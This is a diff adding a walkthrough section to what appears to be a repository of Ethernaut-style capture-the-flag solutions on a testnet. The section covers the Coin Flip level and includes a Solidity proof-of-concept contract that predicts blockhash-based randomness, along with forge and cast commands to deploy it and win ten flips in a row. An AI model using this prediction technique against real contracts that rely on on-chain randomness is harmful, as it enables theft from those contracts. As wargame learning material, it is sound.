@@ -47,6 +47,48 @@ i'm using sepolia testnet for the transactions, u can choose testnet accordingly
    or using script file level02.s.sol
 3. submit the instance, u're done.
 
+## level03 - Coin Flip
+
+1. to complete this level we need to win 10 times in a row.
+2. cuz the flip is calculated onchain using blockhash and block.number, we can predict outcome by stimulating coin flip on our custom smart contract, source code:
+
+   ```solidity
+   // SPDX-License-Identifier: MIT
+   pragma solidity ^0.8.0;
+
+   import "../instances/Ilevel03.sol";
+   import {console} from "forge-std/console.sol";
+
+   contract POC {
+      CoinFlip level3 = CoinFlip(0xdabC2835a457e379FbB3748863D676e08A0df768);
+      uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+      function exploit() external {
+         uint256 blockValue = uint256(blockhash((block.number) - 1));
+         uint256 coinFlip = blockValue / FACTOR;
+         bool side = coinFlip == 1 ? true : false;
+
+         level3.flip(side);
+         console.log("Consecutive Wins: ", level3.consecutiveWins());
+      }
+   }
+   ```
+
+3. Deploy the contract
+   ```
+   forge create src/level03.sol:POC --rpc-url $RPC_URL --private-key $PKEY
+   ```
+4. Now we can call the exploit() function
+   ```
+   cast send $DEPLOYED_ADDRESS "exploit()" --rpc-url $RPC_URL --private-key $PKEY
+   ```
+   call it 10 times as we need to have 10 consecutive wins
+5. u can even check if consecutiveWins is getting updated successfully
+   ```
+   cast call $LEVEL_ADDRESS "consecutiveWins()" --rpc-url $RPC_URL --private-key $PKEY
+   ```
+6. once consecutiveWins hits 10, submit the instance
+
 ## level04 - Telephone
 
 1. goal is to claim ownership but there's a condition, tx.origin !=
